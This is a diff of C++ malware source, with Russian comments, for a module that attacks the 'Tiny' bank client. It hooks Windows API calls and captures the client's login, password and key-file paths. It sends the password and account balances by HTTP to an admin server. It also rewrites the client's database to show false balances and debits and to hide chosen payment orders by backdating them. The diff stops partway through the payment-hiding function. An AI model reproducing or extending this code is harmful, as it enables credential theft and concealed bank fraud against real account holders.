@@ -31,8 +31,35 @@ namespace TINYCLIENT
 namespace Tiny
 {
 
+//какой остаток должен быть для указанного счета
+struct RestAccount
+{
+	char account[32]; //если account[0] = 0, то конец массива
+	TIMESTAMP_STRUCT date; //после какой даты
+	__int64 sum; //какой остаток нужно подставить
+	__int64 debet; //сумма дебета (расхода) в указанный день
+	__int64 oldSum; //какой остаток был до подмены
+	__int64 oldDebet; //какой был дебет до подмены
+};
+
+//скрываемые платежки
+struct HidePayment
+{
+	char account[32];
+	char num[32]; //номер документа
+	__int64 amount; //сумма
+	TIMESTAMP_STRUCT date; //дата платежки
+	int orgDate, dayDate, payDate; //даты до скрытия
+};
+
+static RestAccount restAccounts[10]; //подмена баланса
+static HidePayment hidePayments[10]; //скрываемые платежки
+static bool runHideReplacement = false; //true - если надо провести подмену скрытие
+static bool replacementDone = false; //true если подмена была совершена
+
 const int PROCESS_HASH = 0x9530DB12; // tiny.exe
 const DWORD HashTfAuthNew = 0x19DEB558; //класс окна входа в систему
+const DWORD HashTPasswordDlg = 0xDF7C7D28; //класс окна ввода пароля
 
 char folderTiny[MAX_PATH];
 
@@ -53,8 +80,6 @@ struct ForFindControl
 //состояние (режим работы) системы перехвата SQL запросов
 //1 - чтение баланса счетов (чтение счета), 2 - нужный счет прочитан, чтение баланса
 static int stateSQL = 0; 
-//текущий баланс
-static __int64 currentBalance = 0;
 static char passwordClient[100]; //пароль к клиенту (для отправки через аз)
 static char bankClient[100]; //имя банка клиента
 static int codeBankClient; //код банка
@@ -64,10 +89,12 @@ struct InfoAccount
 {
 	WCHAR account[16]; //счет клиента
 	__int64 balance; //остаток на счету, тип Currency, последние 4-е знака идут после точки (копейки)
+	__int64 oldBalance; //предыдущее значение баланса
 	WCHAR name[128]; //название клиента
 };
 
-static InfoAccount accountClient;
+static InfoAccount accountClient[10]; //текущие остатки на счетах
+static int currAccount = 0; //текущий счет из accountClient
 
 ///////////////////////////////////////////////////////////////////////////////////////////
 //тип функции вызываемой при срабатывании фильтра
@@ -83,10 +110,14 @@ struct FilterSQLFunc
 
 //запрос счетов, стартует передачу баланса
 static int FSF_SelectAmounts( WCHAR* sql, int len ); 
+//после синхронизация обновляется конфиг для установки даты синхронизации, в этот
+//момент нужно запустить подмену
+static int FSF_UpdateConfigLastSync( WCHAR* sql, int len );
 
 FilterSQLFunc filtersSQL[] = 
 {
 { L"select\0amounts\0amountflag\0transflag\0desc\0", 0, FSF_SelectAmounts },
+{ L"update\0config\0lastsync\0", 0, FSF_UpdateConfigLastSync },
 { 0, 0, 0 }
 };
 
@@ -136,6 +167,8 @@ typedef HRESULT (__stdcall *type_get_Type)( void* This, enum DataTypeEnum * pDat
 typedef HRESULT (__stdcall *type_get_Value)( void* This, VARIANT * pvar );
 
 static BOOL (WINAPI *RealDestroyWindow)( HWND hWnd );
+static BOOL (WINAPI *RealConnect)( SOCKET s, const struct sockaddr *name, int namelen );
+static BOOL (WINAPI *RealHttpSendRequestA)( HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength );
 static HRESULT (STDAPICALLTYPE *RealCoCreateInstance)( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv );
 //перехват вызова функций в интерфейсах ADO
 static HRESULT (__stdcall *RealConnection_Open)( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options );
@@ -147,6 +180,10 @@ static bool SetHooks(); //установка хуков в момент активизации системы
 static bool SetHooks2(); //установка хуков в момент запуска приложения
 static bool InitData();
 static bool ReplacementFuncs( void** ppv, int* nums, void** handlerFuncs, void** realFuncs, int count );
+//поток подмены баланса и скрытия платежек
+static DWORD WINAPI ThreadHideReplacement(void*);
+//восстановить баланс и скрываемую платежку
+static void RestoreBalansAndDocs();
 
 static void CloseDB( ODBC* DB )
 {
@@ -293,21 +330,34 @@ static DWORD WINAPI SendBalance( InfoAccount* ia )
 		string azUser = GetAzUser();
 		//pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=getdrop&sum=%s&acc=%s", urlAdmin, Bot->UID.t_str(), azUser.t_str(), balance, account );
 		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", urlAdmin, BOT_UID, azUser.t_str(), balance, account, urlNameBank);
-		DBG( "Tiny", "Отправляем запрос 1 %s", qr.AsStr() );
+		DBG( "Tiny", "Отправляем запрос %s", qr.AsStr() );
 		THTTP H;
 		H.Get(qr.AsStr());
 		STR::Free(account);
 		STR::Free(urlNameBank);
-		currentBalance = ia->balance; //запоминаем текущий баланс
-		char text[128];
-		pwsprintfA( text, "Password=%s", passwordClient );
-		char* urlText= URLEncode(text);
-		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=setlog&log=00&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
-		DBG( "Tiny", "Отправляем запрос 2 %s", qr.AsStr() );
-		H.Get(qr.AsStr());
-		STR::Free(text);
 	}
-	MemFree(ia);
+	return 0;
+}
+
+static DWORD WINAPI SendPassword( void* )
+{
+	DBG( "Tiny", "Отсылка пароля %s", passwordClient );
+	char urlAdmin[128];
+	if( GetAdminUrl(urlAdmin) )
+	{
+		char text[128];
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+		m_lstrcpy( text, "Password=" );
+		m_lstrcat( text, passwordClient );
+		char* urlText= URLEncode(text);
+		TMemory qr(512);
+		string azUser = GetAzUser();
+		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=setlog&log=00&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
+		DBG( "Tiny", "Отправляем запрос %s", qr.AsStr() );
+		THTTP H;
+		H.Get(qr.AsStr());
+		STR::Free(urlText);
+	}
 	return 0;
 }
 
@@ -336,19 +386,8 @@ static void AddStrLog( const char* name, const char* value, char* resultGrab )
 	DBG( "Tiny", buf );
 }
 
-static DWORD SendGrabData( ForFindControl* ffc )
+static void GrabKeys()
 {
-	TMemory resultGrab(512);
-	resultGrab.AsStr()[0] = 0;
-	AddStrLog( "Login", ffc->texts[0], resultGrab.AsStr() );
-	AddStrLog( "Password", ffc->texts[2], resultGrab.AsStr() );
-	SafeCopyStr( passwordClient, sizeof(passwordClient), ffc->texts[2] );
-	AddStrLog( "Path database", ffc->texts[1], resultGrab.AsStr() );
-	AddStrLog( "Path client", folderTiny, resultGrab.AsStr() );
-	m_lstrcpy( pathMDB, ffc->texts[1] );
-	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
-	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
-	MemFree(ffc);
 	//берем в базе данных путь к ключам
 	ODBC* db = OpenDB();
 	if( db )
@@ -370,11 +409,48 @@ static DWORD SendGrabData( ForFindControl* ffc )
 	}
 	else
 		DBG( "Tiny", "Не удалось открыть базу %s", pathMDB );
+}
 
-	pSleep(10000); //ждем немного и закрываем систему
+static DWORD SendGrabData( ForFindControl* ffc )
+{
+	TMemory resultGrab(512);
+	resultGrab.AsStr()[0] = 0;
+	AddStrLog( "Login", ffc->texts[0], resultGrab.AsStr() );
+	AddStrLog( "Password", ffc->texts[2], resultGrab.AsStr() );
+	SafeCopyStr( passwordClient, sizeof(passwordClient), ffc->texts[2] );
+	RunThread( SendPassword, 0 );
+	AddStrLog( "Path database", ffc->texts[1], resultGrab.AsStr() );
+	AddStrLog( "Path client", folderTiny, resultGrab.AsStr() );
+	m_lstrcpy( pathMDB, ffc->texts[1] );
+	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
+	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
+	MemFree(ffc);
+	GrabKeys();
+	pSleep(2000); //ждем немного и закрываем систему
 
-	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };	
-	RestoreFuncs( DLL_USER32,  unhook );
+//	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };
+//	RestoreFuncs( DLL_USER32,  unhook );
+
+	KeyLogger::CloseSession();
+
+	return 0;
+}
+
+static DWORD SendGrabPassword( ForFindControl* ffc )
+{
+	TMemory resultGrab(512);
+	resultGrab.AsStr()[0] = 0;
+	AddStrLog( "Password", ffc->texts[0], resultGrab.AsStr() );
+	SafeCopyStr( passwordClient, sizeof(passwordClient), ffc->texts[0] );
+	RunThread( SendPassword, 0 );
+	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
+	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
+	MemFree(ffc);
+	GrabKeys();
+	pSleep(2000); //ждем немного и закрываем систему
+
+//	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };	
+//	RestoreFuncs( DLL_USER32,  unhook );
 
 	KeyLogger::CloseSession();
 
@@ -419,8 +495,37 @@ static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
 		if( ffc->count >= 3 )
 			RunThread( SendGrabData, ffc );
 	}
+	else if( HashTPasswordDlg == hash )
+	{
+		DBG( "Tiny", "Закрытие окна ввода пароля" );
+		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
+		ffc->count = 0;
+		ffc->hashs = GrabControls;
+		pEnumChildWindows( hwnd, EnumChildProc, ffc );
+		if( ffc->count >= 1 )
+			RunThread( SendGrabPassword, ffc );
+	}
+
 	return RealDestroyWindow(hwnd);
 }
+
+static int WINAPI HandlerConnect( SOCKET s, const struct sockaddr *name, int namelen )
+{
+	DBG( "Tiny", "Connect()" );
+	return RealConnect( s, name, namelen );
+}
+
+static BOOL WINAPI HandlerHttpSendRequestA( HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength )
+{
+	DBG( "Tiny", "HandlerHttpSendRequestA()" );
+	if( replacementDone )
+	{
+		RestoreBalansAndDocs();
+		replacementDone = false;
+	}
+	return RealHttpSendRequestA( hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength );
+}
+
 
 static char* ToHex( char* s, const BYTE* p, int c_p )
 {
@@ -433,7 +538,25 @@ static char* ToHex( char* s, const BYTE* p, int c_p )
 
 static HRESULT __stdcall HandlerConnection_Open( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options )
 {
-//	DBG( "Tiny", "Connection_Open: '%ls','%ls','%ls'", ConnectionString, UserID, Password );
+	DBG( "Tiny", "Connection_Open: '%ls','%ls','%ls'", ConnectionString, UserID, Password );
+	if( pathMDB[0] == 0 )
+	{
+		char* cs = WSTR::ToAnsi( ConnectionString, 0 );
+		char* p = strstr( cs, "Data Source=" );
+		if( p )
+		{
+			p += 12; //+= len("Data Source=")
+			char* p2 = STR::Scan( p, ';' );
+			if( p2 )
+			{
+				int l = p2 - p;
+				m_memcpy( pathMDB, p, l );
+				pathMDB[l] = 0;
+				DBG( "Tiny", "path database: %s", pathMDB );
+			}
+		}
+		STR::Free(cs);
+	}
 	return RealConnection_Open( This, ConnectionString, UserID, Password, Options );
 }
 
@@ -456,6 +579,7 @@ static HRESULT __stdcall HandlerField_get_Value( void* This, VARIANT * pvar )
 			}
 			i++;
 		}
+/*
 		switch( pvar->vt )
 		{
 			case VT_I4:
@@ -471,6 +595,7 @@ static HRESULT __stdcall HandlerField_get_Value( void* This, VARIANT * pvar )
 				DBG( "Tiny", "[%ls] type value = %d", nameField, pvar->vt );
 				break;
 		}
+*/
 	}
 	return hr;
 }
@@ -650,10 +775,14 @@ static HRESULT STDAPICALLTYPE HandlerCoCreateInstance( REFCLSID rclsid, LPUNKNOW
 void Activeted(LPVOID Sender)
 {
 	DBG( "Tiny", "Activated" );
-	PKeyLogSystem System = (PKeyLogSystem)Sender;
-	MegaJump(SendTiny);
-	VideoProcess::RecordPID( 0, "Tiny" );
-	SetHooks();
+//	SetHooks();
+}
+
+//активация при вводе пароля
+void Activeted2(LPVOID Sender)
+{
+	DBG( "Tiny", "Activated2" );
+//	SetHooks();
 }
 
 bool Init( const char* appName )
@@ -673,6 +802,15 @@ bool Init( const char* appName )
 		{
 			F1->OnActivate = Activeted;
 		}
+		char* classWnd2 = "TPasswordDlg";
+		PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, classWnd2, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
+		if( F2 )
+		{
+			F2->OnActivate = Activeted2;
+		}
+		RunThread( ThreadHideReplacement, 0 );
+		MegaJump(SendTiny);
+		SetHooks();
 		return true;
 	}
 	return false;
@@ -683,6 +821,14 @@ static bool SetHooks()
 	if( HookApi( DLL_USER32, 0xEB4A6DB3, &HandlerDestroyWindow, &RealDestroyWindow ) )
 	{
 		DBG( "Tiny", "установили хук на DestroyWindow" );
+	}
+//	if( HookApi( DLL_WINSOCK, 0xEDD8FE8A, &HandlerConnect, &RealConnect ) )
+//	{
+//		DBG( "Tiny", "установили хук на Conenct" );
+//	}
+	if( HookApi( DLL_WININET, 0x9F13856A, &HandlerHttpSendRequestA, &RealHttpSendRequestA ) )
+	{
+		DBG( "Tiny", "установили хук на HttpSendRequest" );
 	}
 	return true;
 }
@@ -701,9 +847,11 @@ static bool InitData()
 	pathMDB[0] = 0;
 	passwordClient[0] = 0;
 	bankClient[0] = 0;
-	currentBalance = 0;
 //	if( GetAdminUrl(domain) == 0 )
 //		domain[0] = 0;
+	restAccounts[0].account[0] = 0;
+	hidePayments[0].account[0] = 0;
+	accountClient[0].account[0] = 0;
 	return true;
 }
 
@@ -713,10 +861,15 @@ static bool InitData()
 static int FSF_SelectAmounts( WCHAR* sql, int len )
 {
 	stateSQL = 1; //чтение баланса
-	accountClient.account[0] = 0;
-	accountClient.balance = 0;
-	accountClient.name[0] = 0;
 	DBG( "Tiny", "FSF_SelectAmounts(): stateSQL = 1, %ls", sql );
+	return 1; //оставить запрос как есть
+}
+
+static int FSF_UpdateConfigLastSync( WCHAR* sql, int len )
+{
+	runHideReplacement = true;
+	DBG( "Tiny", "FSF_UpdateConfigLastSync(): runHideReplacement=true" );
+	pSleep(2000); //делаем задержку, чтобы успела сработать подмена
 	return 1; //оставить запрос как есть
 }
 
@@ -729,33 +882,57 @@ static void FV_Code_Amounts( VARIANT* v )
 	{
 		//счет в таблице представлен как "xxxx xxxxxxxy.zzz", где zzz код валюты (на нужна 980)
 		//вместо пробела (5-я позиция) нужно поставить символ y, почему так сделано неизвестно
-		//ищем точку
-		int i = 0;
+		//другими слова приводим счет к нормальному виду
 		int space = 0;
-		while( v->bstrVal[i] && i < ARRAYSIZE(accountClient.account) - 1 )
+		wchar_t* p = v->bstrVal;
+		wchar_t account[32];
+		wchar_t* t = account;
+		while( *p && *p != L'.' )
 		{
-			if( v->bstrVal[i] == L'.' )
+			if( *p == L' ' )
 			{
-				if( !m_wcsncmp( &v->bstrVal[i + 1], L"980", 3 ) )
+				if( space == 0 ) 
 				{
-					stateSQL = 2;
-					m_wcsncpy( accountClient.account, v->bstrVal, i );
-					if( space > 0 )
-					{
-						accountClient.account[space] = accountClient.account[i - 1];
-						accountClient.account[i - 1] = 0;
-					}
-					else
-						accountClient.account[i] = 0;
-					stateSQL = 2; //нужный счет считан, можно считывать баланс
-					DBG( "Tiny", "stateSQL = 2, account = %ls", accountClient.account );
+					space = p - v->bstrVal;
+					*t++ = *p;
 				}
-				break;
 			}
 			else
-				if( v->bstrVal[i] == L' ' && space == 0 )
-					space = i;
-			i++;
+				*t++ = *p;
+			p++;
+		}
+		if( space > 0 )
+		{
+			account[space] = p[-1];
+			t--;
+		}
+		while( *p ) *t++ = *p++;
+		*t = 0;
+		int len = t - account;
+		int i;
+		currAccount = -1;
+		for( i = 0; i < ARRAYSIZE(accountClient) - 1 && accountClient[i].account[0]; i++ )
+		{
+			if( !m_wcsncmp( account, accountClient[i].account, len ) ) //такой счет есть в массиве
+			{
+				currAccount = i;
+				break;
+			}
+		}
+		if( currAccount < 0 ) //в массиве нет такого счета
+		{
+			if( i < ARRAYSIZE(accountClient) - 1 ) //есть еще место в массиве
+			{
+				//добавляем счет
+				m_wcsncpy( accountClient[i].account, account, len + 1 );
+				accountClient[i + 1].account[0] = 0;
+				currAccount = i;
+			}
+		}
+		if( currAccount >= 0 )
+		{
+			stateSQL = 2; //счет считан, можно считывать баланс
+			DBG( "Tiny", "stateSQL = 2, account = %ls", account );
 		}
 	}
 }
@@ -764,8 +941,9 @@ static void FV_Confirmed_Amounts( VARIANT* v )
 {
 	if( stateSQL == 2 )
 	{
-		accountClient.balance = v->cyVal.int64;
-		DBG( "Tiny", "balance = %I64d", accountClient.balance );
+		accountClient[currAccount].oldBalance = accountClient[currAccount].balance;
+		accountClient[currAccount].balance = v->cyVal.int64;
+		DBG( "Tiny", "balance = %I64d -> %I64d", accountClient[currAccount].oldBalance, accountClient[currAccount].balance );
 	}
 }
 
@@ -773,16 +951,466 @@ static void FV_FullName_Amounts( VARIANT* v )
 {
 	if( stateSQL == 2 )
 	{
-		m_wcscpy( accountClient.name, ARRAYSIZE(accountClient.name), v->bstrVal );
-		DBG( "Tiny", "name account: '%ls'", accountClient.name );
-		if( currentBalance != accountClient.balance )
+		m_wcscpy( accountClient[currAccount].name, ARRAYSIZE(accountClient[currAccount].name), v->bstrVal );
+		DBG( "Tiny", "name account: '%ls'", accountClient[currAccount].name );
+		if( accountClient[currAccount].oldBalance != accountClient[currAccount].balance )
 		{
-			InfoAccount* ia = (InfoAccount*)MemAlloc(sizeof(InfoAccount));
-			m_memcpy( ia, &accountClient, sizeof(InfoAccount) );
-			RunThread( SendBalance, ia );
+			RunThread( SendBalance, &accountClient[currAccount] );
 		}
 		stateSQL = 1;
 	}
+}
+
+////////////////////////////////////////////////////////////////////////////////////////
+// Функции подмены и скрытия
+////////////////////////////////////////////////////////////////////////////////////////
+
+//переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
+//не может быть в числе, в len будет количество прочитанных символов (символов в числе)
+static __int64 SumToInt( const char* s, int* len )
+{
+	__int64 v = 0;
+	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	while( (*s >= '0' && *s <= '9') || *s == '.'  )
+	{
+	    if( *s == '.' ) 
+	    	kop = 0;
+	    else
+	    {
+			v = v * 10 + (*s - '0');
+			if( kop >= 0 ) kop++;
+		}
+		s++;
+	}
+	//добавляем нули в конце чтобы всегда в копейках было две цифры
+	if( kop < 0 ) kop = 0;
+	for( int i = kop; i < 2; i++ ) v *= 10; 
+	if( len ) *len = s - p;
+	return v;
+}
+
+//текст в число, до 1-го не числового символа
+static int ValueToInt( const char* s, int* len )
+{
+	int v = 0;
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	while( *s >= '0' && *s <= '9' )
+	{
+		v = v * 10 + (*s - '0');
+		s++;
+	}
+	if( len ) *len = s - p;
+	return v;
+}
+
+//чтение даты в формате dd.mm.yyyy hh:mm:ss, возвращает количество считанных символов
+static int ReadDate( const char* s, TIMESTAMP_STRUCT* date )
+{
+	m_memset( date, 0, sizeof(TIMESTAMP_STRUCT) );
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	int len;
+	do
+	{
+		date->day = ValueToInt( s, &len ); s += len;
+		if( *s != '.' ) break;
+		s++;
+		date->month = ValueToInt( s, &len ); s += len;
+		if( *s != '.' ) break;
+		s++;
+		date->year = ValueToInt( s, &len ); s += len;
+		if( *s != ' ' ) break;
+		while( *s == ' ' ) s++;
+		date->hour = ValueToInt( s, &len ); s += len;
+		if( *s != ':' ) break;
+		s++;
+		date->minute = ValueToInt( s, &len ); s += len;
+		if( *s != ':' ) break;
+		s++;
+		date->second = ValueToInt( s, &len ); s += len;
+	} while(0);
+	return s - p;
+}
+
+static int ReadString( const char* s, char* buf )
+{
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	while( *s && *s != ' ' ) *buf++ = *s++;
+	*buf = 0;
+	return s - p;
+}
+
+static char* ConvertAccount( const char* from, char* to )
+{
+	const char* sql = "select Code From Amounts";
+	char Code[33];
+	ODBC* DB = OpenDB();
+	if( DB )
+	{
+		SQLHSTMT qr = DB->ExecuteSql( sql, "os32", Code );
+		if( qr )
+		{
+			do
+			{
+				int space = 0;
+				char* p = Code;
+				char* t = to;
+				while( *p && *p != '.' )
+				{
+					if( *p == ' ' )
+					{
+						if( space == 0 ) 
+						{
+							space = p - Code;
+							*t++ = *p;
+						}
+					}
+					else
+						*t++ = *p;
+					p++;
+				}
+				if( space > 0 )
+				{
+					to[space] = p[-1];
+					t--;
+				}
+				while( *p ) *t++ = *p++;
+				*t = 0;
+				if( m_lstrcmp( from, to ) ==  0 )
+				{
+					m_lstrcpy( to, Code );
+					break;
+				}
+			} while( DB->NextRow(qr) );
+			DB->CloseQuery(qr);
+		}
+		CloseDB(DB);
+	}
+	DBG( "Tiny", "ConvertAccount: %s -> %s", from, to );
+	return to;
+}
+
+//считывает строку вида
+//"40702810300010100847 4.82 25.11.2012 10:11: 12, 40702810300010100847 1000.00 27.11.2012; 40702810300010100847 675 26.11.2012, 40702810300010100847 678 28.11.20012";
+//где через запятую перечисляются балансы для подмены: счет сумма дата
+//после точки с запятой идут скрываемые платежки (через запятую): счет номер платежки дата
+static void ReadReplacement( const char* s )
+{
+	//чтение остатка
+	int n = 0;
+	DWORD size;
+	RestAccount* restAccounts2 = (RestAccount*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyOldBalans).t_str() ).t_str(), size );
+	m_memset( &restAccounts, 0, sizeof(restAccounts) );
+	while( *s )
+	{
+		//считываем счет
+		char account[32];
+		s += ReadString( s, account );
+		ConvertAccount( account, restAccounts[n].account );
+		//ищем указанный счет и забираем суммы до подмены
+		int i = 0;
+		while( restAccounts2[i].account[0] )
+		{
+			if( m_lstrcmp( restAccounts[n].account, restAccounts2[i].account ) == 0 )
+			{
+				restAccounts[n].oldSum = restAccounts2[i].oldSum;
+				restAccounts[n].oldDebet = restAccounts2[i].oldDebet;
+				break;
+			}
+			i++;
+		}
+		//сумма
+		int len;
+		restAccounts[n].sum = SumToInt( s, &len );
+		s += len;
+		restAccounts[n].debet = SumToInt( s, &len );
+		s += len;
+		//дата
+		s += ReadDate( s, &restAccounts[n].date );
+		DBG( "Tiny", "Загрузили подмену баланса для счета: %s, остаток: %I64d, дебет: %I64d", restAccounts[n].account, restAccounts[n].sum, restAccounts[n].debet );
+		DBG( "Tiny", "Дата %02d.%02d.%02d", restAccounts[n].date.day, restAccounts[n].date.month, restAccounts[n].date.year );
+		while( *s == ' ' ) s++;
+		n++;
+		if( n >= ARRAYSIZE(restAccounts) - 1 ) break;
+		if( *s++ == ';' ) break;
+	}
+	MemFree(restAccounts2);
+
+	m_memset( &hidePayments, 0, sizeof(hidePayments) ); 
+	HidePayment* hidePayments2 = (HidePayment*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyOldDocs).t_str() ).t_str(), size );
+	n = 0;
+	while( *s )
+	{
+		//считываем счет
+		char account[32];
+		s += ReadString( s, account );
+		ConvertAccount( account, hidePayments[n].account );
+		//ищем указанный счет и забираем даты до скрытия
+		int i = 0;
+		while( hidePayments[i].account[0] )
+		{
+			if( m_lstrcmp( hidePayments[n].account, hidePayments2[i].account ) == 0 )
+			{
+				hidePayments[n].orgDate = hidePayments2[i].orgDate;
+				hidePayments[n].dayDate = hidePayments2[i].dayDate;
+				hidePayments[n].payDate = hidePayments2[i].payDate;
+				break;
+			}
+			i++;
+		}
+		//номер платежки
+		s += ReadString( s, hidePayments[n].num );
+		s += ReadDate( s, &hidePayments[n].date );
+		while( *s == ' ' ) s++;
+		DBG( "Tiny", "Загрузили скрытие платежки: %s %s", hidePayments[n].account, hidePayments[n].num );
+		DBG( "Tiny", "Дата %02d.%02d.%02d", hidePayments[n].date.day, hidePayments[n].date.month, hidePayments[n].date.year );
+		n++;
+		if( *s == 0 || n >= ARRAYSIZE(hidePayments) - 1 ) break;
+		s++;
+	}
+	MemFree(hidePayments2);
+}
+
+//конвертирует дату в целое число посредством запроса в базу данных, в клиенте
+//целое число даты на 2 меньше
+static int ConvertDate( ODBC* DB, TIMESTAMP_STRUCT* date )
+{
+	DWORD MyDate;
+	SQLHSTMT qr = DB->ExecuteSql( "select CLng(?) as MyDate", "it oi", date, &MyDate );
+	DB->CloseQuery(qr);
+	MyDate -= 2;
+	return MyDate;
+}
+
+//корректировка баланса
+static void ReplacementBalance()
+{
+	DBG( "Tiny", "Осуществляем подмену баланса" );
+	int n = 0;
+	ODBC* DB = OpenDB();
+	if( DB )
+	{
+		TMemory sqlBuf(1024);
+		const char* sql;
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+		while( restAccounts[n].account[0] )
+		{
+			DBG( "Tiny", "Для счета %s ставим баланс %I64d", restAccounts[n].account, restAccounts[n].sum );
+			//смотрим какой текущий баланс 
+			char SUM[32];
+			sql = "select Expected from Amounts where Code=?";
+			SQLHSTMT qr = DB->ExecuteSql( sql, "os31 is31", SUM, restAccounts[n].account );
+			if( qr )
+			{
+				DB->CloseQuery(qr);
+				__int64 sum = SumToInt( SUM, 0 );
+				DBG( "Tiny", "Текущий баланс %I64d", sum );
+				__int64 v = restAccounts[n].sum;
+				if( sum != v ) //еще не было подмены или затерли нашу подмену
+				{
+					sql = "update Amounts set Expected=%d.%02d,Confirmed=%d.%d where Code='%s'";
+					pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account );
+					DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
+					qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
+					DB->CloseQuery(qr);
+					restAccounts[n].oldSum = sum;
+				}
+			}
+
+			DBG( "Tiny", "Для счета %s ставим дебет %I64d", restAccounts[n].account, restAccounts[n].debet );
+			int DayDate = ConvertDate( DB, &restAccounts[n].date );
+			//извлекаем текущее значение дебета (сумму расхода за день)
+			sql = "select ConDebit from Turns where Code=? and DayDate=?";
+			qr = DB->ExecuteSql( sql, "os31 is31", SUM, restAccounts[n].account, &DayDate );
+			if( qr )
+			{
+				DB->CloseQuery(qr);
+				__int64 sum = SumToInt( SUM, 0 );
+				DBG( "Tiny", "Текущий дебет %I64d", sum );
+				__int64 v = restAccounts[n].debet;
+				if( sum != v )
+				{
+					sql = "update Turns set ConDebit=%d.%02d where Code='%s' and DayDate=%d";
+					pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account, DayDate );
+					DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
+					qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
+					DB->CloseQuery(qr);
+					restAccounts[n].oldDebet = sum;
+				}
+			}
+			n++;
+		}
+		CloseDB(DB);
+		File::WriteBufferA( BOT::MakeFileName( 0, GetStr(TinyOldBalans).t_str() ).t_str(), &restAccounts, sizeof(restAccounts) );
+	}
+}
+
+//скрытие платежек
+static void HidePayments()
+{
+	DBG( "Tiny", "Скрываем платежки" );
+	ODBC* DB = OpenDB();
+	if( DB )
+	{
+		DWORD dateFirst; //самая ранняя дата платежек
+		const char* sql = "select min(OrgDate) from Documents";
+		SQLHSTMT qr = DB->ExecuteSql( sql, "oi", &dateFirst );
+		if( qr )
+		{
+			DB->CloseQuery(qr);
+			TMemory sqlBuf(1024);
+			fwsprintfA pwsprintfA = Get_wsprintfA();
+			int n = 0;
+			while( hidePayments[n].account[0] )
+			{
+				DBG( "Tiny", "Скрываем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
+				TIMESTAMP_STRUCT endDay; //конец дня, для выбора платежки за определенный день
+				m_memcpy( &endDay, &hidePayments[n].date, sizeof(endDay) );
+				endDay.hour = 23;
+				endDay.minute = 59;
+				endDay.second = 59;
+				int OrgDate, DayDate, PayDate;
+				sql = "select OrgDate, DayDate from Documents where DebitInit=? and Created>=? and Created<=? and Code=?";
+				qr = DB->ExecuteSql( sql, "oi oi is24 it it is31", &OrgDate, &DayDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+				if( qr )
+				{
+					DBG( "Tiny", "1" );
+					DB->CloseQuery(qr);
+					if( OrgDate != dateFirst )
+					{
+						DBG( "Tiny", "2" );
+						sql = "update Documents set OrgDate=?, DayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
+						qr = DB->ExecuteSql( sql, "ii ii is24 it it is31", &dateFirst, &dateFirst, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+						DB->CloseQuery(qr);
+						hidePayments[n].orgDate = OrgDate;
+						hidePayments[n].dayDate = DayDate;
+					}
+				}
+
+				sql = "select OrgDate,DayDate,PayDate from MyDocuments where DebitInit=? and Created>=? and Created<=? and Code=?";
+				qr = DB->ExecuteSql( sql, "oi oi oi is24 it it is31", &OrgDate, &DayDate, &PayDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+				if( qr )
+				{
+					DB->CloseQuery(qr);
+					if( OrgDate != dateFirst )
+					{
+						sql = "update MyDocuments set OrgDate=?, DayDate=?, PayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
+						qr = DB->ExecuteSql( sql, "ii ii ii is24 it it is31", &dateFirst, &dateFirst, &dateFirst, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+						DB->CloseQuery(qr);
+						hidePayments[n].orgDate = OrgDate;
+						hidePayments[n].dayDate = DayDate;
